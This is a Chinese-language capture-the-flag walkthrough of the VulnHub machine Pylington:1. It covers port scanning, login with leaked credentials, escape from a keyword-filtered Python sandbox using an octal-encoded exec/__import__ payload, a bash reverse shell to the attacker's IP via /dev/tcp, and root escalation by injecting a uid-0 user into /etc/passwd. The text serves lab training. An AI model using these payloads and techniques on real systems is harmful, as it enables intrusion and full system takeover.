> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hHPvGnUdc8NY2mbF7V7gRA)

下载地址

https://www.vulnhub.com/entry/pylington-1,684/

环境搭建

VirtualBox，vmware

靶机 pylington:1：192.168.56.105

kali：192.168.56.102  

信息收集

存活 IP 扫描（py 脚本扫描）

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHxPiaibZEO7EmiafJAr07Ss0Fjf4YqhK7gMny2ahtPLLnFznNdcf3ut1mA/640?wx_fmt=png)

发现靶机的 IP 为 192.168.56.105  

端口扫描（Nmap）

```
nmap -sS -sV -T5 -A 192.168.56.105 
-sS：Tcp SYN Scan (sS)，半开放扫描，非三次握手的TCP扫描
-sV：版本检测，扫描目标主机和端口上运行的软件的版本
-T [0-6]：设置定时模板（越高越快）,越高越容易被IDS、防火墙检测屏蔽掉
-A：综合扫描
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeH1ddY3XG3hAm6q3PZxjwbiaLs8eC2NP0aueSiakBR9lISY1w14pHUop4g/640?wx_fmt=png)

开放端口：22 端口和 80 端口  

22 端口

使用 hydra 进行爆破，没有爆破出账号密码

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHcLib8vYiaePKYFOlwSmlPVs9x705sRv5RcbAcyXWE42LIHfrvtiabKo8g/640?wx_fmt=png)

80 端口  

查看源代码没有发现有价值的信息

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHTGJlqHSxRFFDR4F73R9za24cW7iaYWct4LzhiaqbOPatWz7lJofkomiaQ/640?wx_fmt=png)

有个注册页面，无法注册，登录页面经过尝试不存在 sql 注入  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeH4zY0RB0CGebzelBD305WyPgRCKyEjcyKjVPV8jldicHqiaJQWTbrN3Xg/640?wx_fmt=png)

查看 robots.txt，发现三个目录，进行查看

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHxdnbibMCxXFqRWic9glN3IzKISRrZug8h6gTeic3ibze9WKrjP81Dm3nTg/640?wx_fmt=png)

/zbir7mn240soxhicso2z 页面获取到一个用户名密码

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeH4aaq22Azo88EFQcYre77BztSbfEUEEvweIfaUK0r5eb42RVjj8sm1g/640?wx_fmt=png)

使用发现的账号密码进行登录，成功登录

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHVK886blrpwIrwCSTLiawibfEnG1uibRibezoOWibETjaLvNcleCdA58q3XQ/640?wx_fmt=png)

点击 welcome back，stevel 出现 pythonIDE  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHVtQhS9n8HCwm133O690vYsc6s8KBicIsyWbxicSWdQLfLDR3uIv4s9lA/640?wx_fmt=png)

点击在此获得得到 python 文件进行查看  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHCHp3wziac10tdibOwAnmenW5y8Wv2YRF2RCHQvZWLViaYhFZKKXic8vPYw/640?wx_fmt=png)

发现不能出现 import，os，open，否则就会检测到恶意

```
def check_if_safe(code: str) -> bool:  #-> 描述函数的返回类型,从而方便开发人员使用,code:str,输入的只能是str类型
    if 'import' in code: # import is too dangerous
        return False
    elif 'os' in code: # os is too dangerous
        return False
    elif 'open' in code: # opening files is also too dangerous
        return False
    else:
        return True

print(check_if_safe(code='import os'))
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHlowVel8g6hj1VZ2rqlF7dZJPIia7zMRNEJH0G8FPloIbXC5cxdF4d8A/640?wx_fmt=png)

提示沙盒检测到恶意程序

漏洞利用

命令执行获取 shell

**Bypass python sandboxes**

https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#executing-python-code

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHEVyV2Yk23IcnJibSpnSx2hDQtodowWf98FR8UrNQky6urE1ibPJibn4GA/640?wx_fmt=png)

经过测试，使用`__import__()`函数把数据八进制可以绕过成功执行命令

使用解码解密工具进行转化

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeH8yZXjfQM2N7m0SXQzRibX4OHToylhibeUCHLcl1uxO3EFLjLOTpThvfw/640?wx_fmt=png)

在 program 中输入：

exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHLD80cau5yVvaUEsicWptmgUKS99e0d4HWiajbp1vW2ZKRg8ydq6FQSVw/640?wx_fmt=png)

成功执行了 ls 命令

kali nc 监听

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHLmNl1aoibnOibwg9PY4DvsgB2kicngd2PUIhE9OQ6ZmpEvsVibQRFIzAog/640?wx_fmt=png)

Bash 反弹 shell：bash -i >& /dev/tcp/192.168.56.102/12340>&1

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHc1BVa4KzGBuBmiaWkST4Ag7ttibmlhTlrHgibiaJib1IIl7aALEHNxSI1sg/640?wx_fmt=png)

获得 shell  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHDU79lFL1VicXOeBmbhb9MiaPoapYHTtCU0ad0MnEg3icubGfLia5ricTA8A/640?wx_fmt=png)

提权

获取一个可交互式的 shell

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

在用户 py 目录下发现可运行文件 typing

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHz7OqSezCh2RohyW23uqlX9kcN8Ovp6m3Uff4yfaefveficKnOKW8LDA/640?wx_fmt=png)

运行后提示输入 the quick brown fox jumps over thelazy dog 后得到密码 54ezhCGaJV

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHFNZCOWhVHRUUXpbLvTCbup22UUuM9TqI12dIhJibqaVMLkTvZ6XdvKw/640?wx_fmt=png)

ssh 连接进行登录 py 用户，查看 user.txt 得到第一个 flag

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHdD2sjicXmsbsZq8KcWLomJqaPT6ExwEb4paoU9r3TGWicWd318Qlyqkg/640?wx_fmt=png)

在 Secret_stuff 目录下的 backup.cc 文件进行查看

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHaJOXibw8J0PR5YwxytcHCUaOOwAO08b5kKnicQt4Y5F0W6OqKF4jXAtg/640?wx_fmt=png)

发现有备份文件的功能，可以利用将账号密码写入到 / etc/passwd 里面获得 root 权限  

使用 mkpasswd 查看本机的当前密码

```
mkpasswd -m sha-512
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHaDCOa4qQpyjntqibY1nRG1B09PiblfhNibaN6MvVuBNSYETwabfznWDcw/640?wx_fmt=png)

根据 /etc/passwd 编辑一个具有 root 权限的用户

```
lemonlove:$6$PX/xRZ043jtDQv1l$F4sTC8J3QHy7EJnHAnUSyHX0zqwjemKCjqaruBxjmlOEKZhWvCoQ9Sn86FDsrVZM8P9vwKrdqGj4OzmZE9q1P1:0:0:root:/root:/bin/bash
```

接着执行 backup 进行备份到 /etc/passwd

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHHjegXDTtjTSiaibxeCQq74QDkGvguUgpZ8bz2RDJNN5FonZ7IQG4WiazQ/640?wx_fmt=png)

备份完成后查看 passwd 文件发现已经添加成功

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHKdo01NIHp6wJibgnJpAVaxWcQ3RicnZES6ATUSHufAGducIpNxYQ9coA/640?wx_fmt=png)

切换到 lemonlove 账号，进入到 root 目录获取到第二个 flag

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHiafTh9n179bNkCuy7AgmGSGpWToYLSG2PGjeNzhrzHiad0ibJib55v20uw/640?wx_fmt=png)

解码解密工具

公众号后台回复【离线解码解密工具】就可以拿到下载链接啦

 7 月 14 日白色情人节

SlLVER  DAY

为你千千万万遍

![](https://mmbiz.qpic.cn/mmbiz_jpg/0YvAy5BgkyP4sG9I5Uia79XON2icwLeIeHic51P0icvrpgTl6Lg4YIZgpClR58Ql0U4ObaOgHPLCZUXGd5Q7qdyerw/640?wx_fmt=jpeg)

银色情人节也是爱侣之间互赠银制礼品的日子

传统习俗是用银戒订婚，戴在手上，作为甜蜜

心情的见证。